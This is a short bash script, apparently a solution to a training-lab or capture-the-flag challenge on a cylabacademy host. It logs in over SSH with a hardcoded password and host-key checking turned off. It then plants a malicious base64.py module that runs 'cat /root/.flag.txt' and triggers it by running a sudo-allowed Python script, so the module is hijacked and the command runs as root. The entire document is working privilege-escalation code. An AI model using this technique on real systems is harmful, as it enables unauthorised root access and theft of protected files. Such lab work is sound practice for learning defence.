#!/bin/bash
export SSHPASS=qX7p-yZ0EX
SSH="sshpass -e ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 17161 academy@chatelaine.cylabacademy.net"
$SSH 'printf "%s\n" "import os" "os.system(\"cat /root/.flag.txt\")" > /home/academy/base64.py' 2>&1 | tail -2
$SSH 'cd /home/academy && echo qX7p-yZ0EX | sudo -S /usr/bin/python3 /home/academy/.server.py 2>&1 | head -5' 2>&1 | tail -6
